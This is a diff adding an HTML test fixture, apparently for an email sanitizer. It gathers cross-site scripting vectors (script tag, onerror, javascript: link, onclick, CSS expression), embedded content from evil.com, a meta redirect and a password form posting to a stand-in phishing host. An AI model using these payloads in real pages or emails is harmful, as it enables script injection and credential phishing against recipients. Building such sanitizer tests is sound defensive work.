@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Malicious Email Demo</title>
+  <link rel="stylesheet" href="https://evil.com/style.css">
+  <meta http-equiv="refresh" content="0;url=https://evil.com">
+</head>
+<body>
+  <script>alert('xss from script tag')</script>
+  <img src="x" onerror="alert('xss from img onerror')">
+  <a href="javascript:alert('xss from javascript href')">javascript link</a>
+  <iframe src="https://evil.com/iframe"></iframe>
+  <form action="https://evil.com/phish">
+    <input type="password" name="credentials">
+  </form>
+  <object data="https://evil.com/object"></object>
+  <embed src="https://evil.com/embed"></embed>
+  <div onclick="alert('xss from onclick')">clickable div</div>
+  <div style="width: expression(alert('xss')); behavior: url(evil.htc)">expression div</div>
+  <style>
+    body { background-image: url('https://evil.com/bg.png'); }
+  </style>
+</body>
+</html>
